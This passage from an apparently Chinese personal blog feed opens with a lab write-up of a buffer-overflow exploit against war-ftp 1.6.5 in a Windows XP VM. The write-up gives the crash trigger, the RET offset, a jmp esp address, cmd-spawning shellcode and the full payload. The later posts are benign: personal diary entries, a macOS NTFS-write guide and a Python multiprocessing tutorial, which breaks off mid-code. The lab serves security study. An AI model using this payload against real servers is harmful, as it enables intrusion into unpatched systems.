      <content type="html"><![CDATA[<h2 id="一-漏洞分析"><a href="#一-漏洞分析" class="headerlink" title="一 漏洞分析"></a>一 漏洞分析</h2><h3 id="1-1-验证漏洞"><a href="#1-1-验证漏洞" class="headerlink" title="1.1 验证漏洞"></a>1.1 验证漏洞</h3><p>在Windows XP虚拟机中，使用OllyDbg装载war-ftp1.6.5，并运行程序。允许匿名登录FTP。</p><a id="more"></a><p>图1是正常情况下系统的界面：<img src="img_warftp漏洞利用实验/Screen%20Shot%202019-04-24%20at%2010.35.17%20AM.png" alt="Screen Shot 2019-04-24 at 10.35.17 AM"></p><center>图1. 正常界面</center><p>利用python代码来验证漏洞：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ftplib <span class="keyword">import</span> FTP </span><br><span class="line">ftp = FTP(host=<span class="string">'10.211.55.9'</span>)</span><br><span class="line">user = <span class="string">'A'</span> * <span class="number">500</span></span><br><span class="line">ftp.login(user, <span class="string">'www'</span>)</span><br></pre></td></tr></table></figure><p>发送登录请求后，系统还能够正常使用，状态无明显变化，因为warftp是多线程的。</p><p>利用CDB进行调试，再次发送登录请求，当登录的用户名长度达到500个字节时，CDB能够捕捉到错误的信息。在调试器中，能够看到EIP指向了41414141（41为’A’的ASCII码）如图2所示：</p><p><img src="img_warftp漏洞利用实验/Screen%20Shot%202019-04-23%20at%2011.14.47%20PM.png" alt="Screen Shot 2019-04-23 at 11.14.47 PM"></p><center>图2. 系统崩溃</center><h3 id="1-2-定位溢出点地址"><a href="#1-2-定位溢出点地址" class="headerlink" title="1.2 定位溢出点地址"></a>1.2 定位溢出点地址</h3><p>利用PatternTool生成2000个不循环的字符串，作为用户名，向warftp发起请求，这里EIP被填充为32714131，执行patterntool，计算出RET的偏移量为485，如图3所示。由于EBP占4个字节，所以存放局部变量的缓冲区大小为481个字节。</p><p><img src="img_warftp漏洞利用实验/Screen%20Shot%202019-04-24%20at%209.48.05%20AM.png" alt="Screen Shot 2019-04-24 at 9.48.05 AM"></p><center>图3. 定位RET</center><h3 id="1-3-寻找JMP指令地址"><a href="#1-3-寻找JMP指令地址" class="headerlink" title="1.3 寻找JMP指令地址"></a>1.3 寻找JMP指令地址</h3><p>希望通过在RET的位置放置<code>jmp esp</code>指令的地址，来实现程序的跳转。在Windows系统的许多DLL中都能找到这条指令，一个通用的地址是<strong>0x7ffa4512</strong>。</p><p>因此继续来验证改地址的指令是否为<code>jmp esp</code>。如图4所示，可以看到地址为0x7ffa4512的指令的确为<code>jmp esp</code>。</p><p><img src="img_warftp漏洞利用实验/Screen%20Shot%202019-04-24%20at%209.57.58%20AM.png" alt="Screen Shot 2019-04-24 at 9.57.58 AM"></p><center>图4. 验证指令地址</center><h2 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二 漏洞利用"></a>二 漏洞利用</h2><h3 id="2-1-构造Shellcode"><a href="#2-1-构造Shellcode" class="headerlink" title="2.1 构造Shellcode"></a>2.1 构造Shellcode</h3><p>这里从metasploit上选择一个弹出命令行对话框的Shellcode。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">buf += "\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x04\xC6\x45"</span><br><span class="line">buf += "\xF8\x63\xC6\x45\xF9\x6D\xC6\x45\xFA\x64\xC6"</span><br><span class="line">buf += "\x45\xFB\x2E\xC6\x45\xFC\x65\xC6\x45\xFD\x78"</span><br><span class="line">buf += "\xC6\x45\xFE\x65\x6A\x01\x8D\x45\xF8\x50\xBA"</span><br><span class="line">buf += "\xad\x23\x86\x7c"</span><br><span class="line">buf += "\xFF\xD2\xC9"</span><br></pre></td></tr></table></figure><h3 id="2-2-定位Shellcode存放位置"><a href="#2-2-定位Shellcode存放位置" class="headerlink" title="2.2 定位Shellcode存放位置"></a>2.2 定位Shellcode存放位置</h3><p>在程序崩溃时，查看ESP指向的内容为<strong>0x71413471</strong>，计算其偏移量为493。说明ESP指向字符串的第493个字节。因此，把Shellcode放在字符串的第493个字节。</p><p><img src="img_warftp漏洞利用实验/Screen%20Shot%202019-04-24%20at%2010.15.11%20AM.png" alt="Screen Shot 2019-04-24 at 10.14.05 AM"></p><center>图5. 定位shellcode存放地址</center><h3 id="2-3-完整Payload"><a href="#2-3-完整Payload" class="headerlink" title="2.3 完整Payload"></a>2.3 完整Payload</h3><p>在确定了Shellcode的存放位置，以及<code>jmp esp</code>指令的地址之后，继续来构造完整的Payload进行攻击。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">buf = 'A' * 485 + '\x12\x45\xfa\x7f' + 'B' * 4</span><br><span class="line">buf += "\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x04\xC6\x45"</span><br><span class="line">buf += "\xF8\x63\xC6\x45\xF9\x6D\xC6\x45\xFA\x64\xC6"</span><br><span class="line">buf += "\x45\xFB\x2E\xC6\x45\xFC\x65\xC6\x45\xFD\x78"</span><br><span class="line">buf += "\xC6\x45\xFE\x65\x6A\x01\x8D\x45\xF8\x50\xBA"</span><br><span class="line">buf += "\xad\x23\x86\x7c"</span><br><span class="line">buf += "\xFF\xD2\xC9"</span><br></pre></td></tr></table></figure><h3 id="2-4-攻击主机"><a href="#2-4-攻击主机" class="headerlink" title="2.4 攻击主机"></a>2.4 攻击主机</h3><p>编写攻击代码，向目标发送payload。可以看到成功弹出了命令行。说明攻击成功。</p><p><img src="/images/placeholder.png" alt="Screen Shot 2019-04-24 at 10.30.59 AM" data-src="img_warftp漏洞利用实验/Screen%20Shot%202019-04-24%20at%2010.30.59%20AM.png" class="lazyload"></p><center>图6. 攻击成功</center>]]></content>
      
      
        <tags>
            
            <tag> Exploit </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>迟来的总结</title>
      <link href="/2019/01/19/%E8%BF%9F%E6%9D%A5%E7%9A%84%E6%80%BB%E7%BB%93/"/>
      <content type="html"><![CDATA[<p>终于，坐上回去的高铁，虽然是先去上海玩两天。很庆幸这次高铁是复兴号，能让我这个基本上很少坐高铁的人感受下复兴号有没有推背感。😆</p><p>不知不觉，自己读研居然也有半年了，只是一直都找不到空闲的时间，做做自己想做的事情。</p><a id="more"></a><p>其实这半年不知道自己算是过得开心，还是不开心，不管怎么样还是熬过来了。认识了很多新朋友，大家都很厉害。在北京，给我一种感觉就是，<strong>不管是谁都很努力，只要你进步的速度稍微放慢一点，就会被别人超过</strong>。</p><p>在学校待了半年，同学的水平真的是令人吃惊，最出乎意料的是现在认识好几个女生都是直博，不管是硕士还是博士，一个比一个拼。让我这种早上起不来床的人，真的是“打扰了，告辞”</p><p>陆陆续续在北京待的时间也快一年了，有一个想法就是无论来过北京，就像经历高考和考研，我觉得需要花个3-5年的时间来北京看看，即使以后不留在北京。简单的说就是见个世面吧。</p><p>这半年最难受的就是，期中一堆结课的时候和期末结束的时候。期中结课的时候，真的是一堆作业和project要交，做ppt、写报告。每天一睁眼就是，今天啥作业要交了。🙃</p><p>不过我还算好的，毕竟期末只用考3科，有两科还比较水，就当成文科来背就好了。算法考试，看师生情吧，真的是读书十几年头一次考完之后要觉得要挂科的一门课。当然不是老师讲的不好，老师是很厉害，也很有气质的一个老师。我觉得还是我的数学基础太差了。😑</p><p>本来在考试结束前，每天复习的时候总想着考完试，要好好写篇短文。当手一放在键盘上的时候，突然一下子又想不起来什么了。</p><p>不知道说什么。最后就预祝大家归途上顺利平安，过个好年吧……</p><hr><p>再说一句测评：复兴号推背感也是不想很强烈嘛。不过这个市区内加速度是真的快，目前时速258km/h🤣。</p><p>​                                                        于去往上海的高铁上。</p><p>​                                                            2019.1.19</p>]]></content>
      
      
        <tags>
            
            <tag> about-myself </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>元旦的气息～</title>
      <link href="/2018/12/23/%E5%85%83%E6%97%A6%E7%9A%84%E6%B0%94%E6%81%AF%EF%BD%9E/"/>
      <content type="html"><![CDATA[<p>今天，虽然23号离元旦还有一周，学院还是办了一个元旦晚会。同样今天也是考研结束的日子，在这里祝愿自己的小女友能够获得她心仪的offer，让她这半年的辛苦没有白费。</p><a id="more"></a><p>难得抽空去看可能是硕士阶段唯一一场晚会吧。然后一开始还是有点<del>职业病</del>神经，一坐下来就习惯性在心里挑别人的毛病。（因为自己在大学也策划过几次晚会，然后就习惯性找做的不好的地方了）</p><p>后来才慢慢调整自己的心态，想起来当年自己筹办一场晚会也是很不容易。投入很多心思。</p><p>看到大家呈现的节目效果都还是很棒的，特别是一个小哥哥和一个小姐姐唱歌很好听。</p><p>在北京我觉得最有意思的就是在晚会上看到<strong>相声</strong>。在本科看了那么多场晚会，很少有出相声的，因为我觉得这个除了一种文化积累之外，还需要天生骨子里带点幽默的细胞。而且，个人觉得在南方相声文化没有太多的积累。而相声却又是最能引起全场共鸣，活跃氛围的一个节目。</p><p>同时才发现原来科院里面真的还是大家都是才华横溢，可能也就我是一条咸鱼了。</p><p>UCAS雁栖湖的校区比较新，舞台灯光的效果是真的棒，我觉得真的算比较一流的。就是手机太渣，拍出来都很糊。</p><p>像明年如果有时间，还有机会的话，还是像参与到策划里面，作为一个有点点经验的人，还是喜欢把这点发展成自己的一个长处吧。</p><p>马上也就快期末了。老师也给一篇论文要看，感觉自己可能写文的速度应该会比较慢吧，也可能没有这么一整段时间去写。</p><p>想着等考完试过年的时候，可以把自己的一些复习整理的资料分享出来。</p><p>最后，祝各位在双🥚之际，都能有勇气表白自己的心上人 or 被自己喜欢的人表白，期末周复习顺利，考试高分。</p><p>Merry Christmas～🔔</p><p>预祝元旦快乐～🧨</p>]]></content>
      
      
        <tags>
            
            <tag> about-myself </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Mac读写外接硬盘的几个建议</title>
      <link href="/2018/12/16/Mac%E8%AF%BB%E5%86%99%E5%A4%96%E6%8E%A5%E7%A1%AC%E7%9B%98%E7%9A%84%E5%87%A0%E4%B8%AA%E5%BB%BA%E8%AE%AE/"/>
      <content type="html"><![CDATA[<p>这篇是<strong>新手向</strong>，<strong>小白向</strong>，CS相关专业的大佬，或者熟练使用计算机的同学，可以关掉了。</p><p>相信用Mac的同学，都有个很难受的问题，就是Mac自带的固态硬盘太小。想在购机的时候就买大容量硬盘，那个价格都够买一箱子的机械了。</p><a id="more"></a><p>但是这里有个问题就是普遍机械硬盘默认都是<strong>NTFS</strong>格式。Mac只能读不能写，瞬间就感觉自己的硬盘变砖了。</p><p>下面针对三种不同的使用范围，给出我个人三种不同的建议：</p><h2 id="1-硬盘仅用于自己的Mac电脑扩展存储容量"><a href="#1-硬盘仅用于自己的Mac电脑扩展存储容量" class="headerlink" title="1. 硬盘仅用于自己的Mac电脑扩展存储容量"></a>1. 硬盘仅用于自己的Mac电脑扩展存储容量</h2><p>这种情况下，我觉得最好的方法就是无脑格式化成Mac OS X自己的格式，兼容性毋庸置疑是最好的，读写速度也很快。</p><h2 id="2-硬盘数据用于分享且数据不太重要"><a href="#2-硬盘数据用于分享且数据不太重要" class="headerlink" title="2. 硬盘数据用于分享且数据不太重要"></a>2. 硬盘数据用于分享且数据不太重要</h2><p>有时候想用硬盘给同学拷点东西，这时候如果对方是Windows系统的话，就比较尴尬了。😅</p><p>这里也有办法，如果你的数据不太重要，就算丢失了也没关系，可以再来一次的话。</p><p>我建议就是格式化成<strong>exFAT</strong>格式，这种是现在常用大容量U盘的格式。我自己也试过，插入到Windows系统的笔记本上，会显示<strong>新U盘</strong>，可读可写。</p><h2 id="3-硬盘数据较重要且偶尔会分享"><a href="#3-硬盘数据较重要且偶尔会分享" class="headerlink" title="3. 硬盘数据较重要且偶尔会分享"></a>3. 硬盘数据较重要且偶尔会分享</h2><p>这时候的选择就只能是<strong>NTFS</strong>了。首先是目前主流的硬盘格式（毕竟Windows的市场份额摆在这里）且<strong>NTFS</strong>比较容易进行数据恢复。</p><p>那可能有人会疑惑Mac不是写不了<strong>NTFS</strong>吗？</p><p>其实Mac好像在OS X 10.xx 之后就开始支持了NTFS的读写，只是默认情况下并没有打开。</p><p>下面👇就看下如何打开NTFS的读写。</p><h3 id="Step-1-找到终端"><a href="#Step-1-找到终端" class="headerlink" title="Step 1. 找到终端"></a>Step 1. 找到终端</h3><p>呼出<strong>spotlight</strong>，然后输入“终端”或者“terminal”，会出现一个黑色的窗口，然后窗口里面有个小尖尖。</p><p>打开这个应用。</p><h3 id="Step-2-输入命令"><a href="#Step-2-输入命令" class="headerlink" title="Step 2. 输入命令"></a>Step 2. 输入命令</h3><p>在这个黑色的窗口里面敲入下面的命令，建议直接复制：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vi <span class="regexp">/etc/</span>fstab</span><br></pre></td></tr></table></figure></p><p>这时候会提示输入密码，密码就是平时你开机登陆的那个密码。</p><h3 id="Step-3-更改文件"><a href="#Step-3-更改文件" class="headerlink" title="Step 3. 更改文件"></a>Step 3. 更改文件</h3><p>这时候会打开一个新文件，但实际上还是黑色的窗口。</p><p>这时候你要在<strong>英文</strong>输入法状态下，按一下<strong>“a”</strong>。</p><p>这时候你会看到黑色框框的左下角出现一个<strong>“INSERT”</strong>字样。</p><p>这时候你把下面的命令敲到黑色窗口里面，或者直接复制：<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LABEL</span><span class="bash">=Store none ntfs rw,auto,nobrowse</span></span><br></pre></td></tr></table></figure></p><p>这时候，用左右的<strong>方向键</strong>，来修改<strong>“Store”</strong>这个单词，改成<strong>你的硬盘的名字</strong>（就是在你Mac桌面上显示的硬盘名字），假如你的硬盘有多个分区，那么改成你想要用的<strong>那个分区的名字</strong>。（实际上还是桌面上的名字，因为多个分区会在Mac桌面上显示多个硬盘，你就选一个就好了）。</p><p>修改完之后，按<code>ESC</code>，然后你发现左下角的<strong>“INSERT”</strong>不见了。</p><p>再按<code>shift</code>+<code>:</code>，后面那个是冒号。</p><p>再输入<strong>”wq“</strong>，敲回车，就好了</p><p>这时候你弹出硬盘之后，再插入硬盘，会发现桌面上你之间选择的那个硬盘不见了。😱</p><h3 id="Step-4-添加快捷方式"><a href="#Step-4-添加快捷方式" class="headerlink" title="Step 4. 添加快捷方式"></a>Step 4. 添加快捷方式</h3><p>其实硬盘分区还在，就是被Mac隐藏了。</p><p>还是在之前那个黑框框里面，用命令来进行操作。</p><p>这里有两种方式：</p><h4 id="A-只为自己刚刚选的硬盘做快捷方式（Recommend）"><a href="#A-只为自己刚刚选的硬盘做快捷方式（Recommend）" class="headerlink" title="A. 只为自己刚刚选的硬盘做快捷方式（Recommend）"></a>A. 只为自己刚刚选的硬盘做快捷方式（Recommend）</h4><p>输入下面的命令<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s <span class="regexp">/Volumes/</span>Store<span class="regexp">/ ~/</span>Desktop<span class="regexp">/Store</span></span><br></pre></td></tr></table></figure></p><p>这里建议直接复制，然后修改<strong>”Store“</strong>单词为自己的在Step 3中所选的硬盘（分区）的名字，前后两个<strong>“Store”</strong>都要改。</p><p>然后<code>Enter</code>。</p><p>现在可以在桌面上看到自己的硬盘（分区）了。😄</p><h4 id="B-看到Mac所识别的所有硬盘（分区）（Not-Recommend）"><a href="#B-看到Mac所识别的所有硬盘（分区）（Not-Recommend）" class="headerlink" title="B. 看到Mac所识别的所有硬盘（分区）（Not Recommend）"></a>B. 看到Mac所识别的所有硬盘（分区）（Not Recommend）</h4><p>方式与第一种差不多，就是对命令进行微微的修改。</p><p>输入下面的命令<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s <span class="string">/Volumes</span> ~<span class="string">/Desktop/Volumes</span></span><br></pre></td></tr></table></figure></p><p>这里复制完命令之后，可以直接<code>Enter</code></p><p>好了，这些就是我自己试过的一些方法，均亲测有效。希望可以给大家提供一些帮助。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/bb412953bec3" target="_blank" rel="noopener">Mac OS开启原生读取NTFS的功能</a></p>]]></content>
      
      
        <tags>
            
            <tag> Mac-OSX </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python3多进程</title>
      <link href="/2018/12/11/Python3%E5%A4%9A%E8%BF%9B%E7%A8%8B/"/>
      <content type="html"><![CDATA[<p>由于这两天自己负责的数据处理模块，都涉及到IO密集的数据读写，为了能够加快处理速度和调试速度，就想着使用Python的多进程，顺便借此机会，系统地学习一下Python的多进程。</p><a id="more"></a><p>多进程主要由以下几种方式：</p><ol><li><p><code>fork</code>（<strong>仅支持Unix/Linux系统</strong>）</p></li><li><p><code>multiprocessing</code>（跨平台多进程）</p><ul><li><p><code>Pool</code></p></li><li><p><code>Process</code></p></li></ul></li></ol><p>依次来看下这几种方式创建和实现多进程。</p><h2 id="1-fork"><a href="#1-fork" class="headerlink" title="1. fork"></a>1. fork</h2><p><code>fork</code>其实是操作系统提供的API，操作系统从当前进程（父进程）创建（说“复制”可能更恰当）一个子进程。<code>fork</code>函数会从父进程和子进程分别都返回一次。</p><p>简单的看一个例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 代码是廖雪峰博客的代码</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">print(<span class="string">'Process (%s) start...'</span> % os.getpid())</span><br><span class="line"><span class="comment"># Only works on Unix/Linux/Mac:</span></span><br><span class="line">pid = os.fork()</span><br><span class="line">print(pid, type(pid))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> pid == <span class="number">0</span>:</span><br><span class="line">    print(<span class="string">'I am child process (%s) and my parent is %s.'</span> % (os.getpid(), os.getppid()))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'I (%s) just created a child process (%s).'</span> % (os.getpid(), pid))</span><br></pre></td></tr></table></figure><p>这段代码的输出结果如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Process (18838) start...</span><br><span class="line"><span class="number">18841</span> &lt;<span class="keyword">class</span> <span class="string">'int'</span>&gt;</span><br><span class="line">I (<span class="number">18838</span>) just created a <span class="keyword">child</span> process (<span class="number">18841</span>).</span><br><span class="line"><span class="number">0</span> &lt;<span class="keyword">class</span> <span class="string">'int'</span>&gt;</span><br><span class="line">I am <span class="keyword">child</span> process (<span class="number">18841</span>) <span class="keyword">and</span> my <span class="keyword">parent</span> <span class="keyword">is</span> <span class="number">18838.</span></span><br></pre></td></tr></table></figure><p>根据输出，来简单地理解下<code>fork</code>的基本流程。</p><p>第1行：是当前进程（即父进程的输出提示）。</p><p>第2,3行：结合两个输出提示一起看，不难理解<code>os.fork()</code>返回的<code>pid=18841</code>是其新复制出来的子进程的进程号。此时，正在执行的是父进程。</p><p>第4,5行：此时输出<code>pid=0</code>，且正在执行的是子进程。</p><p>可以理解成，从<code>os.fork()</code>往后，我们的进程复制了一份（包括<code>fork</code>后面的代码），变成了两个进程。</p><p>两个进程同时在执行，只不过在子进程中，<code>fork</code>返回的永远是0，父进程中返回的时子进程的ID。</p><p>因此可以这样通过简单判断的返回的结果，来区别子进程和父进程不同的工作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">print(<span class="string">'Process (%s) start...'</span> % os.getpid())</span><br><span class="line"><span class="comment"># Only works on Unix/Linux/Mac:</span></span><br><span class="line">pid = os.fork()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> pid == <span class="number">0</span>:</span><br><span class="line">    sub_process_job() <span class="comment"># 子进程的任务</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    current_process_job() <span class="comment"># 父进程的任务</span></span><br></pre></td></tr></table></figure><p>但是这种方法不好的地方，主要存在于限制了代码运行平台，对于python这种跨平台的语言来说，显然是不合适的。</p><h2 id="2-multiprocessing-Process"><a href="#2-multiprocessing-Process" class="headerlink" title="2. multiprocessing.Process"></a>2. multiprocessing.Process</h2><p><code>multiprocessing</code>模块提供一个<code>Process</code>类来代表一个进程对象。下面的进程主要演示启动一个子进程并等待其结束：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 代码来自廖雪峰博客</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 子进程要执行的代码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_proc</span><span class="params">(name)</span>:</span></span><br><span class="line"> print(<span class="string">'Run child process %s (%s)...'</span> % (name, os.getpid()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line"> print(<span class="string">'Parent process %s.'</span> % os.getpid())</span><br><span class="line"> p = Process(target=run_proc, args=(<span class="string">'test'</span>,))</span><br><span class="line"> print(<span class="string">'Child process will start.'</span>)</span><br><span class="line"> p.start()</span><br><span class="line"> p.join()</span><br><span class="line"> print(<span class="string">'Child process end.'</span>)</span><br></pre></td></tr></table></figure></p><p>输出结果如下：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Parent <span class="built_in">process</span> <span class="number">22676.</span></span><br><span class="line">Child <span class="built_in">process</span> will <span class="built_in">start</span>.</span><br><span class="line">Run child <span class="built_in">process</span> test (<span class="number">22686</span>)...</span><br><span class="line">Child <span class="built_in">process</span> <span class="keyword">end</span>.</span><br></pre></td></tr></table></figure></p><p>这个过程就比之前的<code>fork</code>创建进程更加清晰，也更容易理解。只需要在创建进程时，传递目标函数和参数即可。</p><p>其中，进程的<code>join()</code>方法，我理解的是，当前进程（父进程）让子进程加入到自己的执行过程中，也就是父进程先等待子进程运行结束后，再继续往下执行。主要<strong>用于进程间的同步</strong>。</p><h2 id="3-multiprocessing-Pool"><a href="#3-multiprocessing-Pool" class="headerlink" title="3. multiprocessing.Pool()"></a>3. multiprocessing.Pool()</h2><p><code>multiprocessing</code>还提供进程池，可以批量启动大量子进程。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 代码来自廖雪峰博客</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> os, time, random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">long_time_task</span><span class="params">(name)</span>:</span></span><br><span class="line"> print(<span class="string">'Run task %s (%s)...'</span> % (name, os.getpid()))</span><br><span class="line"> start = time.time()</span><br><span class="line"> time.sleep(random.random() * <span class="number">3</span>)</span><br><span class="line"> end = time.time()</span><br><span class="line"> print(<span class="string">'Task %s runs %0.2f seconds.'</span> % (name, (end - start)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line"> print(<span class="string">'Parent process %s.'</span> % os.getpid())</span><br><span class="line"> p = Pool(<span class="number">4</span>)</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line"> p.apply_async(long_time_task, args=(i,))</span><br><span class="line"> print(<span class="string">'Waiting for all subprocesses done...'</span>)</span><br><span class="line"> p.close()</span><br><span class="line"> p.join()</span><br><span class="line"> print(<span class="string">'All subprocesses done.'</span>)</span><br></pre></td></tr></table></figure></p><p>输出结果如下：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Parent process <span class="number">24058.</span></span><br><span class="line">Waiting for all subprocesses done...</span><br><span class="line">Run task <span class="number">0</span> (<span class="number">24064</span>)...</span><br><span class="line">Run task <span class="number">2</span> (<span class="number">24066</span>)...</span><br><span class="line">Run task <span class="number">1</span> (<span class="number">24065</span>)...</span><br><span class="line">Run task <span class="number">3</span> (<span class="number">24067</span>)...</span><br><span class="line">Task <span class="number">2</span> runs <span class="number">0.68</span> seconds.</span><br><span class="line">Run task <span class="number">4</span> (<span class="number">24066</span>)...</span><br><span class="line">Task <span class="number">4</span> runs <span class="number">0.15</span> seconds.</span><br><span class="line">Task <span class="number">1</span> runs <span class="number">1.16</span> seconds.</span><br><span class="line">Task <span class="number">0</span> runs <span class="number">2.18</span> seconds.</span><br><span class="line">Task <span class="number">3</span> runs <span class="number">2.47</span> seconds.</span><br><span class="line">All subprocesses done.</span><br></pre></td></tr></table></figure></p><p>因为本人的机子是双核的（虚拟化后是四核），所以可以一次性批量启动4个进程。第5个进程需要等待其中任意一个进程执行结束之后，才能启动。</p><p><code>p.join()</code>的方法会等待线程池中所有的子进程都结束后，才会继续执行。</p><blockquote><p>插入个小插曲，在我之前做的一个小任务中，需要读取大量CSV文件，并将数据导入到数据库，一开始选择了将文件列表尽量平均的分割成多个子列表分别分配给各个子进程。最后导致代码一开始跑得飞快，但是越到后面越慢，甚至还出现多余残留的CSV文件。</p><p>后来，知道了线程池类中提供了<code>map</code>方法，可以理解成多进程的<code>map</code>。使用方法，与python内置的<code>map</code>是相同的。</p></blockquote><p>上面那个小例子也可以改成：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> os, time, random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">long_time_task</span><span class="params">(name)</span>:</span></span><br><span class="line"> print(<span class="string">'Run task %s (%s)...'</span> % (name, os.getpid()))</span><br><span class="line"> start = time.time()</span><br><span class="line"> time.sleep(random.random() * <span class="number">3</span>)</span><br><span class="line"> end = time.time()</span><br><span class="line"> print(<span class="string">'Task %s runs %0.2f seconds.'</span> % (name, (end - start)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line"> print(<span class="string">'Parent process %s.'</span> % os.getpid())</span><br><span class="line"> p = Pool(<span class="number">4</span>)</span><br><span class="line"> <span class="comment"># for i in range(5):</span></span><br><span class="line"> <span class="comment">#     p.apply_async(long_time_task, args=(i,))</span></span><br><span class="line"> p.map(long_time_task, [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>)])</span><br><span class="line"> <span class="comment"># print('Waiting for all subprocesses done...')</span></span><br><span class="line"> <span class="comment"># p.close()</span></span><br><span class="line"> <span class="comment"># p.join()</span></span><br><span class="line"> print(<span class="string">'All subprocesses done.'</span>)</span><br></pre></td></tr></table></figure></p><p>输出的结果如下：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 